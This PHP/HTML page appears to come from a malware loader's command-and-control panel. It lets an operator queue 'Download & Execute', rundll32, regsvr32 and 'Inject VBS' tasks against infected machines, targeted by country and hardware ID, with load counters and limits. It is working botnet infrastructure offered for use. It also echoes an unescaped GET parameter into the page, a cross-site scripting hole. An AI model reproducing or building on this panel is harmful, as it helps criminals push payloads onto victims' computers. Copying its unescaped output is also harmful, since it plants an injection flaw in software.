<!DOCTYPE html>
<html>
	<head>
		<link rel="stylesheet" type="text/css" href="./css/commands.css">
	</head>
	
	<body>
		<div class="task-container">
			<div class="task-content">
				<div class="task-content-title">
					Create
				</div>
				
				<div class="task-listview-container">
					<form method="POST">
						<table>
							<tr>
								<td>
									Type:
								</td>
								<td>
									<select class="task-type" name="type">
										<option value="0">Download & Execute</option>
									 </select>
								</td>
							</tr>
							<tr>
								<td>
									Limit:
								</td>
								<td>
									<input class="task-textbox" type="text" name="limit">
								</td>
							</tr>
							<tr>
								<td>
									Link:
								</td>
								<td>
									<input class="task-textbox" type="text" name="link">
								</td>
							</tr>
							<tr>
								<td>
									Country:
								</td>
								<td>
									<input class="task-textbox" type="text" name="country">
								</td>
							</tr>
							<tr>
								<td>
									HWIDs:
								</td>
								<td>
									<?php
										$s_Bid = $_GET["bid"];
										echo "<input class=\"task-textbox\" type=\"text\" name=\"hwid\" value=\"$s_Bid\">";
									?>
								</td>
							</tr>
							<tr>
								<td></td>
								<td>
									<input class="kostil" type="text" name="command" value="tcreate">
									<input class="task-button" type="submit" value="Create">
								</td>
							</tr>
						</table>
					</form>
				</div>
			</div>
			
			<div class="task-content">
				<div class="task-content-title">
					Tasks
				</div>
				
				<div class="task-listview-container">
					<table class="task-listview">
						<th>
							ID
						</th>
						<th>
							Type
						</th>
						<th>
							Link
						</th>
						<th>
							Limit
						</th>
						<th>
							Country
						</th>
						<th>
							HWIDs
						</th>
						<th>
							Action
						</th>
						<?php
							$a_Data = GetTaskList();
							$a_Types = ["Download&Execute", "Download&Execute (rundll32)", "Download&Execute (regsvr32)", "Inject VBS"];
							$b_SomeAdded = false;
							
							foreach ($a_Data as $row)
							{
								$s_Id = htmlentities($row["id"]);
								$s_Action = $a_Types[$row["type"]];
								$s_Link = htmlentities($row["link"]);
								$s_Hwid = htmlentities($row["hwid"]);
								$s_Loads = htmlentities($row["loads"]);
								$s_Limit = htmlentities($row["limit"]);
								$s_Geo = htmlentities($row["country"]);
								
								if(!$s_Geo)
									$s_Geo = "N.A";
								
								if(!$s_Hwid)
									$s_Hwid = "N.A";
								
								echo "<tr>
									<td>$s_Id</td>
									<td>$s_Action</td>
									<td>$s_Link</td>
									<td>$s_Loads &frasl; $s_Limit</td>
									<td>$s_Geo</td>
									<td>$s_Hwid</td>
									<td>
										<form method=\"POST\">
											<input class=\"kostil\" type=\"text\" name=\"command\" value=\"tdelete\">
											<input class=\"kostil\" type=\"text\" name=\"tid\" value=\"$s_Id\">
											<input class=\"task-delete\" type=\"submit\" value=\"delete\">
										</form>
									</td>
								</tr>";
								
								$b_SomeAdded = true;							
							}
							
							if(!$b_SomeAdded)
								echo "<tr><th class=\"nempty\" colspan=\"7\">~ Empty ~</th></tr>";
							
						?>
					</table>
				</div>
			</div>
		</div>
	</body>
</html>